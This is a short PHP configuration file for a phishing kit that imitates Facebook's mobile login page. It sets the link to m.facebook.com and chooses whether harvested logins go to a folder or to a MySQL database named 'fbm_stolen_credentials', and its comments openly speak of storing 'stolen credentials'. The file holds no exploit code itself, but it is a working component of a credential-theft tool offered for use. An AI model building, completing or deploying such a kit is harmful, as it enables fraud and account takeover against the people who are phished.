<?php
# configuration for phishing with facebook (mobile version)
$facebook_mobile_link = "https://m.facebook.com"; // linking

// if you wanna use database instead of storing stolen credentials
// in a folder, set $use_db to true (DEFAULT: false).
$use_db = true;

// mysql server properties
$db_host = "localhost"; // your host
$db_user = "root"; // your mysql user
$db_pass = ""; // your mysql password (DEFAULT: empty).
$db_name = "fbm_stolen_credentials"; // your database name

?>
